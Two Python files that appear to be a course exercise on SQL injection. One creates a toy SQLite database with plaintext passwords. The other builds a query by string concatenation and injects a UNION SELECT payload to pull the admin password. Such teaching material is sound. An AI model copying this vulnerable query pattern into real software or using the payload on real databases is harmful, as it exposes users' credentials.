# create_test_db.py
import sqlite3
	import os
	 
	# Creates agents.sqlite
	# TMC has issues with binary files, so we will go around by creating it locally from the text dump.
	 
	db = \
	"""
	PRAGMA foreign_keys=OFF;
	BEGIN TRANSACTION;
	CREATE TABLE Users (name TEXT, password TEXT, admin BOOL);
	INSERT INTO Users VALUES('admin','coffee',1);
	INSERT INTO Users VALUES('bob','passwd',0);
	CREATE TABLE Tasks (name TEXT, body TEXT);
	INSERT INTO Tasks VALUES('bob','become admin');
	INSERT INTO Tasks VALUES('admin','good to be king');
	INSERT INTO Tasks VALUES('bob','profit');
	COMMIT;
	"""
	 
	if os.path.exists('tasks.sqlite'):
		print('tasks.sqlite already exists')
	else:
		conn = sqlite3.connect('tasks.sqlite')
		conn.cursor().executescript(db)
		conn.commit()



# injection.py
#!/usr/bin/env python3
	import sys
	import sqlite3
	import string
	 
	def query():
		return "34rr435' UNION SELECT password FROM Users WHERE admin=1; --"
	 
	 
	def main(argv):
		username = sys.argv[1]
		dbname = sys.argv[2]
		conn = sqlite3.connect(dbname)
		cursor = conn.cursor()
		response = cursor.execute("SELECT body FROM Tasks WHERE name='" + username + "' and body LIKE '%" + query() + "%'").fetchall()
		print('Found entries:')
		for r in response:
			print(r[0])
	 
	 
	# This makes sure the main function is not called immediatedly
	# when TMC imports this module
	if __name__ == "__main__": 
		if len(sys.argv) != 3:
			print('usage: python %s username database' % sys.argv[0])
		else:
			main(sys.argv)
			
